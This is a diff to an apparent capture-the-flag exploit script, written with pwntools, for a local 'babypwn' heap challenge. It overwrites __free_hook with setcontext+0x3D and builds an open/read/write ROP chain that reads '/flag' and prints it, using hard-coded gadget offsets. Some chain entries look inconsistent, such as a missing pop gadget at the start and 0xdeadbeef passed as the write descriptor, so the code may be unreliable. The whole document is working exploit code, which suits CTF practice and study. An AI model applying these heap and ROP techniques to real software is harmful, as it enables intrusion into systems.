@@ -3,7 +3,9 @@ from pwn import *
 context(arch='amd64', log_level='debug')
 
 io = process('./babypwn')
+# io = process(['../../../../ld/ld-2.27.so', './babypwn'], env={"LD_PRELOAD": "./libc.so.6"})
 libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
+# libc = ELF('./libc.so.6')
 
 def add(size):
     io.sendlineafter(b'>>> ', b'1')
@@ -106,6 +108,7 @@ writefile = base + libc.symbols['write']
 poprdi_ret = base + 0x23B6A
 poprsi_ret = base + 0x2601F
 poprdx_ret = base + 0x142C92
+addrsp0x18_ret = base + 0x349ea
 
 add(0xF0 + 0x100)                   # chunk #5
 edit(5, cyclic(0xF0) + p64(0) + p64(0x101) + p64(__free_hook))
@@ -116,24 +119,32 @@ edit(7, p64(setcontext + 0x3D))     # change __free_hook to setcontext + 0x3D, r
 add(0xF0 + 0x100)                   # chunk #8
 chunk8_addr = chunk1_addr + 0x410
 
-ROP = b'./flag'.ljust(0x30, b'\x00')    # 0x0
-ROP += p64(poprdi_ret)                  # 0x30
-ROP += p64(chunk8_addr + 0x10)          # 0x38
-ROP += p64(poprsi_ret)                  # 0x40
-ROP += p64(2)                           # 0x48
-ROP += p64(openfile)                    # 0x50
-ROP += p64(poprdi_ret)                  # 0x58
-ROP += p64(3)                           # 0x60
-ROP += p64(poprsi_ret)                  # 0x68
-ROP += p64(chunk8_addr + 0x10)          # 0x70
-ROP += p64(poprdx_ret)                  # 0x78
-ROP += p64(0x30)                        # 0x80
-ROP += p64(readfile)                    # 0x88
-ROP += p64(poprdi_ret)                  # 0x90
-ROP += p64(1)                           # 0x98
-ROP += p64(poprsi_ret)                  # 0xA0
-
+ROP = b'/flag'.ljust(0x30, b'\x00')     # 0x0
+ROP += p64(chunk8_addr + 0x10)          # 0x30
+ROP += p64(poprsi_ret)                  # 0x38
+ROP += p64(2)                           # 0x40
+ROP += p64(openfile)                    # 0x48
+ROP += p64(poprdi_ret)                  # 0x50
+ROP += p64(3)                           # 0x58
+ROP += p64(poprsi_ret)                  # 0x60
+ROP += p64(chunk8_addr + 0xF0)          # 0x68
+ROP += p64(poprdx_ret)                  # 0x70
+ROP += p64(0x30)                        # 0x78
+ROP += p64(readfile)                    # 0x80
+ROP += p64(poprdi_ret)                  # 0x88
+ROP += p64(1)                           # 0x90
+ROP += p64(addrsp0x18_ret)              # 0x98
+ROP += p64(chunk8_addr + 0x40)          # 0xA0
+ROP += p64(poprdi_ret)                  # 0xA8
+ROP += p64(0xdeadbeef)                  # 0xB0
+ROP += p64(poprsi_ret)                  # 0xB8
+ROP += p64(chunk8_addr + 0xF0)          # 0xC0
+ROP += p64(poprdx_ret)                  # 0xC8
+ROP += p64(0x30)                        # 0xD0
+ROP += p64(writefile)                   # 0xD8
+edit(8, ROP)
 gdb.attach(io)
 time.sleep(5)
+delete(8)
 
 io.interactive()
